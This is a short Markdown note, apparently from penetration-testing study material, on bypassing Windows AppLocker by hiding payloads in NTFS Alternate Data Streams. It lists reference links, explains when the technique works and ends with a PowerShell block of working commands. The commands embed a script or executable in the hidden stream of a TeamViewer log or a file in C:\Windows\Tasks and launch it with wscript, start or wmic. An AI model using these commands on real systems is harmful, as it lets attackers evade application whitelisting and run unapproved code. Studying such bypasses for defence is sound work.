# Resources
- https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
- https://hitco.at/blog/howto-prevent-bypassing-applocker-using-alternate-data-streams/
- https://lolbas-project.github.io/#/alternate%20data%20streams

## Requirements

If you have write and execute access to a file in a subdirectory of allowed AppLocker paths (such as C:\Windows or C:\Program Files), it is possible to abuse Alternate Data Streams (ADS) to bypass AppLocker. By embedding a malicious executable or script into a file's ADS (such as an .exe or .js), you could then attempt to execute the payload.

AppLocker policies often focus on blocking file execution by file paths and filenames. ADS allows embedding the payload in a hidden stream of an existing file, which may bypass these restrictions. For example, a DLL or executable embedded in ADS could potentially be executed through trusted processes like rundll32.exe or control.exe, bypassing AppLocker restrictions in certain cases.

```powershell
type test.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
wscript "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"

type C:\Windows\System32\cmd.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:cmd.exe"
start "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:cmd.exe"

type c:\users\student\Desktop\twigs.exe > "C:\Windows\Tasks\test.log:twigs.exe"
wmic process call create '"C:\Windows\Tasks\test.log:twigs.exe"'

```
